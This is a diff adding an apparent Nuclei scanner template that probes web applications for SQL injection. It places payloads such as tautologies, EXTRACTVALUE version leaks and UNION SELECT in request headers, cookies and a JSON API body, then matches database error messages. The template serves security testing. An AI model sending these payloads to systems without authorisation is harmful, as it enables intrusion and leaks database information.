@@ -1,0 +1,137 @@
+id: sqli-header-cookie-injection-detection
+
+info:
+  name: SQL Injection - Header & Cookie Based Detection
+  author: achraf-chehboun
+  severity: high
+  description: |
+    Detects SQL injection through HTTP headers and cookies that are commonly logged
+    or processed by backend applications. Many WAFs only inspect URL parameters and
+    POST body, missing injections via User-Agent, Referer, X-Forwarded-For, Cookie,
+    and custom headers. Non-destructive detection only.
+  reference:
+    - https://owasp.org/Top10/A03_2021-Injection/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-89
+  metadata:
+    max-request: 5
+  tags: owasp-top10,sqli,injection,header-injection,cookie-injection,detection-only
+
+http:
+  # User-Agent header injection
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0' AND '1'='1'--
+        Accept: text/html
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: ua-sqli-error
+        regex:
+          - '(?i)sql.*?syntax'
+          - '(?i)mysql.*?error'
+          - '(?i)PostgreSQL.*?ERROR'
+          - '(?i)ORA-\d{5}'
+          - '(?i)SQLSTATE\['
+          - '(?i)Warning.*?mysql_'
+          - '(?i)Unclosed quotation mark'
+        condition: or
+
+  # Referer header injection
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Referer: {{BaseURL}}/page?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
+        Accept: text/html
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: referer-sqli-error
+        regex:
+          - '(?i)sql.*?syntax'
+          - '(?i)mysql.*?error'
+          - '(?i)PostgreSQL.*?ERROR'
+          - '(?i)ORA-\d{5}'
+          - '(?i)SQLSTATE\['
+          - '(?i)XPATH syntax error'
+        condition: or
+
+  # X-Forwarded-For header injection (commonly logged to DB)
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: 127.0.0.1' AND '1'='1'--
+        X-Real-IP: 127.0.0.1' OR '1'='1'--
+        Accept: text/html
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: xff-sqli-error
+        regex:
+          - '(?i)sql.*?syntax'
+          - '(?i)mysql.*?error'
+          - '(?i)PostgreSQL.*?ERROR'
+          - '(?i)ORA-\d{5}'
+          - '(?i)SQLSTATE\['
+        condition: or
+
+  # Cookie injection
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: session=1' AND '1'='1'--; user_id=1' OR '1'='1'--; lang=en' UNION SELECT NULL--
+        Accept: text/html
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: cookie-sqli-error
+        regex:
+          - '(?i)sql.*?syntax'
+          - '(?i)mysql.*?error'
+          - '(?i)PostgreSQL.*?ERROR'
+          - '(?i)ORA-\d{5}'
+          - '(?i)SQLSTATE\['
+          - '(?i)Unclosed quotation mark'
+        condition: or
+
+  # JSON body SQL injection (REST API)
+  - raw:
+      - |
+        POST /api/search HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json
+
+        {"query":"test' OR '1'='1","filter":"1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT 1)))--","sort":"id' ASC--","limit":"10 OR 1=1"}
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: json-api-sqli-error
+        regex:
+          - '(?i)sql.*?syntax'
+          - '(?i)mysql.*?error'
+          - '(?i)PostgreSQL.*?ERROR'
+          - '(?i)ORA-\d{5}'
+          - '(?i)SQLSTATE\['
+          - '(?i)PDOException'
+          - '(?i)QueryException'
+        condition: or
+
+    extractors:
+      - type: regex
+        name: error-detail
+        group: 0
+        regex:
+          - '(?i)((?:sql|database)[\w\s]*(?:error|exception)[^<\n]{0,200})'
